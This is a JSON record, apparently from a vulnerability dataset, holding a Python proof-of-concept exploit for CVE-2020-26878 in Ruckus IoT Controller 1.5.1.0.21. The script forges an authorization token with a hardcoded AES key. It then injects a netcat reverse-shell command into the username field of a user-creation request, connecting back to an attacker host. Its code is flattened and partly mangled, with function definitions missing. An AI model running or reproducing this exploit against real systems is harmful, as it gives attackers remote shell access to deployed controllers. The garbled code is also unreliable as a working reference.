{
    "text": "vul_name : Ruckus IoT Controller 1.5.1.0.21 Remote Code Execution ， vul_cve : CVE-2020-26878 ， vul_poc :  # Product : Ruckus IoT Controller ( Ruckus vRIoT )  ，  # Version : <= 1.5.1.0.21 ，  # Vendor :  ，  # Vulnerability : Command Injection & Broken Authentication ，  # Discovered by : Juan Manuel Fernandez ，  # Exploit Title : Ruckus IoT Controller ( Ruckus vRIoT ) 1.5.1.0.21 - Remote Code Execution ，  # Exploit Author : Emre SUREN ，  # Disclosure Date : 2020-10-26 ，  # Tested on : Appliance ，  #  ! /usr/bin/python ，  # - * - coding : utf-8 - * - ， from Crypto.Cipher import AES ， from base64 import b64encode , b64decode ， from colorama import Fore ， urllib3.disable_warnings ( urllib3.exceptions.InsecureRequestWarning )  ， opt = str ( raw_input ( Fore.YELLOW + \" [ ? ] Listening \" + lhost + \" \" + lport + \" ( i.e. netcat ) ? ( y/n )  : \" )  ， payload=\" ; rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc \"+lhost+\" \"+lport+\" >/tmp/f ;  # \" ， enc_dec_method = 'utf-8' ， salt = 'nplusServiceAuth' ， salt = salt.encode ( \"utf8\" )  ， str_key = 'serviceN1authent' ， str_to_enc = 'TlBMVVMx' ， aes_obj = AES.new ( str_key , AES.MODE_CFB , salt )  ， hx_enc = aes_obj.encrypt ( str_to_enc.encode ( \"utf8\" )  ， mret = b64encode ( hx_enc ) .decode ( enc_dec_method )  ， payload = generatePayload ( lhost , lport )  ， post_data = { ， \"username\" : payload ,  ， \"password\" : \"test\" ， } ， print ( Fore.BLUE + \" [  *  ] Payload\\t : \" + payload )  ， token = generateMagicToken (  )  ， headers = { ， \"Authorization\" : token ， } ， rpath = \"/service/v1/createUser\" ， uri = ' + rhost + \" : \" + rport + rpath ， r = requests.post ( uri , json=post_data , headers=headers , verify=False )  ， print ( Fore.BLUE + \" [  *  ] Request sent\" )  ， print ( Fore.GREEN + \" [ + ] Successful. Check for the session.\" )  ， print ( Fore.RED + \" [ X ] Failed. Check for the response.\" )  ， print ( Fore.BLUE + \" [  *  ] Response\\t : \" + r.text )  ， sys.exit (  )  ， print ( \" [  *  ] Usage : ruckus151021.py <RHOST> <RPORT> <LHOST> <LPORT>\" )  ， print ( \" [  *  ] <RHOST> -> Target IP\" )  ， print ( \" [  *  ] <RPORT> -> Target Port\" )  ， print ( \" [  *  ] <LHOST> -> Attacker IP\" )  ， print ( \" [  *  ] <LPORT> -> Attacker Port\" )  ， print ( \" [  *  ] Example : python {} 192.168.2.25 443 192.168.2.3 9001\".format ( sys.argv [ 0 ]  )  ， exit ( 0 )  ， rhost = sys.argv [ 1 ]  ， rport = sys.argv [ 2 ]  ， lhost = sys.argv [ 3 ]  ， lport = sys.argv [ 4 ]  ， print ( Fore.RED + \" [  !  ] Please listen at port {} to connect a reverse session ! \".format ( lport )  ， execCmd ( rhost , rport , lhost , lport )  ， main (  ) ",
    "time": "2020.11.29"
}